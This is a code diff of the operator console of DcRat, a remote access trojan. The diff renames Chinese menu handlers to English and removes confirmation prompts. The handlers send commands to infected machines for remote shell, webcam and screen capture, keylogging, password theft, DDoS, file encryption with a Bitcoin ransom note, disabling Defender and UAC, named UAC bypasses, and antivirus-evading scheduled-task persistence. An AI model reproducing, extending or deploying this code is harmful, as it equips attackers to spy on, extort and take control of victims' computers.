@@ -17,6 +17,9 @@ using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using cGeoIp;
+using System.Resources;
+using System.ComponentModel;
+using System.Globalization;
 
 namespace Server
 {
@@ -40,6 +43,7 @@ namespace Server
             };
         }
 
+
         #region Form Helper
         private void CheckFiles()
         {
@@ -52,7 +56,7 @@ namespace Server
                 }
 
                 if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Client.exe")))
-                    MessageBox.Show("疑似被杀毒软件删除客户端，请关闭杀毒软件重新解压使用");
+                    MessageBox.Show("Missing client file,please close the Anti-virus and unzip again.");
 
                 if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                     Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
@@ -141,6 +145,7 @@ namespace Server
                 }
             }
             catch { }
+
 
             CheckFiles();
             lvwColumnSorter = new ListViewColumnSorter();
@@ -272,12 +277,12 @@ namespace Server
         {
             Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
             lock (Settings.LockListviewClients)
-                toolStripStatusLabel1.Text = $"在线 {listView1.Items.Count.ToString()}     选中 {listView1.SelectedItems.Count.ToString()}                    发送 {Methods.BytesToString(Settings.SentValue).ToString()}     接收 {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     内存 {(int)performanceCounter2.NextValue()}%";
+                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received  {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     Memory {(int)performanceCounter2.NextValue()}%";
         }
 
         #endregion
 
-        
+
         #region Logs
         private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -387,7 +392,7 @@ namespace Server
             catch { }
         }
 
-        
+
 
         private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -567,14 +572,14 @@ namespace Server
         }
 
         #endregion
-                
+
         [DllImport("uxtheme", CharSet = CharSet.Unicode)]
         public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
 
         private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
         {
 #if DEBUG
-            MessageBox.Show("你不应在debug模式创建客户端", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            MessageBox.Show("You shouldn't build client in debug mode.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
             return;
 #endif
             using (FormBuilder formBuilder = new FormBuilder())
@@ -591,7 +596,7 @@ namespace Server
             }
         }
 
-        private void 命令行ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -626,7 +631,7 @@ namespace Server
             }
         }
 
-        private void 桌面ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -658,7 +663,7 @@ namespace Server
             }
         }
 
-        private void 摄像头ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -694,7 +699,7 @@ namespace Server
             }
         }
 
-        private void 文件ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -726,7 +731,7 @@ namespace Server
             }
         }
 
-        private void 进程ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void ProcrssManagerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -757,8 +762,8 @@ namespace Server
                 return;
             }
         }
-                
-        private async void 至硬盘ToolStripMenuItem_Click(object sender, EventArgs e)
+
+        private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -799,7 +804,7 @@ namespace Server
             }
         }
 
-        private void 至内存ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -841,11 +846,11 @@ namespace Server
 
         }
 
-        private void 发送通知ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
-                string Msgbox = Interaction.InputBox("Message", "Message", "您已经在DcRat控制下");
+                string Msgbox = Interaction.InputBox("Message", "Message", "Controlled by DcRat");
                 if (string.IsNullOrEmpty(Msgbox))
                     return;
                 else
@@ -872,7 +877,7 @@ namespace Server
             }
         }
 
-        private void 聊天ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -899,11 +904,11 @@ namespace Server
             }
         }
 
-        private void 访问网站ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
-                string url = Interaction.InputBox("访问网站", "URL", "https://www.baidu.com");
+                string url = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com");
                 if (string.IsNullOrEmpty(url))
                     return;
                 else
@@ -930,7 +935,7 @@ namespace Server
             }
         }
 
-        private void 修改壁纸ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -966,7 +971,7 @@ namespace Server
             }
         }
 
-        private void 键盘记录ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -998,7 +1003,7 @@ namespace Server
             }
         }
 
-        private void 开启ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void StartToolStripMenuItem2_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1025,7 +1030,7 @@ namespace Server
             }
         }
 
-        private void 关闭ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void StopToolStripMenuItem3_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1051,13 +1056,13 @@ namespace Server
                 return;
             }
         }
-        
 
-        private void 开启ToolStripMenuItem1_Click(object sender, EventArgs e)
+
+        private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
-                string title = Interaction.InputBox("在特定窗口打开时发出提示", "TITLE", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
+                string title = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
                 if (string.IsNullOrEmpty(title))
                     return;
                 else
@@ -1092,7 +1097,7 @@ namespace Server
             }
         }
 
-        private void 关闭ToolStripMenuItem2_Click(object sender, EventArgs e)
+        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1113,7 +1118,7 @@ namespace Server
             }
         }
 
-        private void 关闭ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1137,7 +1142,7 @@ namespace Server
             }
         }
 
-        private void 重启ToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1161,7 +1166,7 @@ namespace Server
             }
         }
 
-        private void 升级ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1195,35 +1200,31 @@ namespace Server
             }
         }
 
-        private void 卸载ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            DialogResult dialogResult = MessageBox.Show(this, "确定要卸载吗", "Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-            if (dialogResult == DialogResult.Yes)
+            try
             {
-                try
-                {
-                    MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Pac_ket").AsString = "uninstall";
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "uninstall";
 
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
-                    foreach (Clients client in GetSelectedClients())
-                    {
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                    }
-                }
-                catch (Exception ex)
+                foreach (Clients client in GetSelectedClients())
                 {
-                    MessageBox.Show(ex.Message);
-                    return;
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
             }
         }
 
-        private void 储存文件夹ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1250,7 +1251,7 @@ namespace Server
             }
         }
 
-        private void 重启ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1275,7 +1276,7 @@ namespace Server
             }
         }
 
-        private void 关机ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1300,7 +1301,7 @@ namespace Server
             }
         }
 
-        private void 注销ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1325,7 +1326,7 @@ namespace Server
             }
         }
 
-        private void 屏蔽客户端ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (FormBlockClients form = new FormBlockClients())
             {
@@ -1333,13 +1334,13 @@ namespace Server
             }
         }
 
-        private void 退出ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
         {
             notifyIcon1.Dispose();
             Environment.Exit(0);
         }
 
-        private void 文件查找ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (FormFileSearcher form = new FormFileSearcher())
             {
@@ -1367,7 +1368,7 @@ namespace Server
                 }
             }
         }
-        private void 详细信息ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1394,7 +1395,7 @@ namespace Server
             }
         }
 
-        
+
         private readonly FormDOS formDOS;
         private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -1424,11 +1425,11 @@ namespace Server
             }
         }
 
-        private void 加密ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
-                string Msgbox = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.02 BITCOIN. Our address is 1234567890");
+                string Msgbox = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890");
                 if (string.IsNullOrEmpty(Msgbox))
                     return;
                 else
@@ -1458,7 +1459,7 @@ namespace Server
             }
         }
 
-        private void 解密ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1492,11 +1493,11 @@ namespace Server
             }
         }
 
-        private void 关闭WDToolStripMenuItem_Click(object sender, EventArgs e)
+        private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "仅适用于Admin权限", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                DialogResult dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                 if (dialogResult == DialogResult.Yes)
                 {
                     try
@@ -1526,7 +1527,7 @@ namespace Server
             }
         }
 
-        private void 录音ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1554,113 +1555,94 @@ namespace Server
             }
         }
 
-        private void 有提示ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "此方法适用于所有机器，需要用户手动同意。", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uac";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uac";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
 
-        private void 无提示不过360ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "本方法适用于没有360等会监控注册表的杀软的机器，比如只有WD时。", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uacbypass";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
 
-        private void 过360启动项ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count > 0) 
+            if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "安装将会复制文件至所选地址并添加计划任务启动项，暂时不支持卸载，暂时不支持修改计划任务名称及运行间隔时间。\nps:此方法安装请保证客户端及加载器等无安装功能，确认安装？", "安装（过360无核晶）", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    string Msgbox = Interaction.InputBox("安装名称", "安装名称", @"calc.exe");
-                    if (string.IsNullOrEmpty(Msgbox))
-                        return;
-                    else
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "startbypass";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        try
-                        {
-                            MsgPack packet = new MsgPack();
-                            packet.ForcePathObject("Pac_ket").AsString = "startbypass";
-                            packet.ForcePathObject("filepath").AsString = Msgbox;
-
-                            MsgPack msgpack = new MsgPack();
-                            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                            foreach (Clients client in GetSelectedClients())
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            MessageBox.Show(ex.Message);
-                            return;
-                        }
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
 
-        private void 密码恢复ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1672,7 +1654,7 @@ namespace Server
                 {
                     ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
-                new HandleLogs().Addmsg("密码提取中", Color.Black);
+                new HandleLogs().Addmsg("Recovering...", Color.Black);
             }
             catch (Exception ex)
             {
@@ -1681,45 +1663,41 @@ namespace Server
             }
         }
 
-        private void 过360核晶ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "本方法适用于有360并开启了核晶的机器。", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass3";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uacbypass3";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
 
-        private void 关闭UACToolStripMenuItem_Click(object sender, EventArgs e)
+        private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "仅适用于Admin权限", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                DialogResult dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                 if (dialogResult == DialogResult.Yes)
                 {
                     try
@@ -1749,7 +1727,7 @@ namespace Server
             }
         }
 
-        private void 打开CD槽ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void OpenCDToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -1776,51 +1754,48 @@ namespace Server
             }
         }
 
-        private void win7ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "本方法适用于有360并开启了核晶的机器。", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
 
-        private void 文档ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Process.Start("https://github.com/qwqdanchun/DcRat");
         }
 
-        private void 设置ToolStripMenuItem_Click(object sender, EventArgs e)
+        private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
         {
             using (FormSetting formSetting = new FormSetting())
             {
                 formSetting.ShowDialog();
             }
         }
+
     }
 }
